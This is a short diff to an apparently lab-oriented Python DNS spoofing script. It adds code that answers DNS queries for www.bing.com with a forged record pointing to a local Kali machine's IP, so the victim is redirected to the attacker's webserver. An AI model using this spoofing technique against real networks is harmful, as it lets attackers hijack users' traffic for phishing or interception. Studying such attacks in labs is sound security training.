@@ -17,7 +17,11 @@ def process_packet(packet):
         qname_str = qname.decode('utf-8')
         if "www.bing.com" in qname_str:
             print("[+] Spoofing Target is in: " + qname_str)
-            # **** Here we can put our code to redirect the User somewhere else **** #
+            # Specify the DNS Response (DNSRR) to redirect the User somewhere else #
+            # rrname is the same, www.bing.com
+            # rdata gives the IP of the webserver hosted on my Kali machine
+            # This is where we want to redirect our user to
+            answer = DNSRR(rrname=qname, rdata="192.168.63.139")
 
 
 
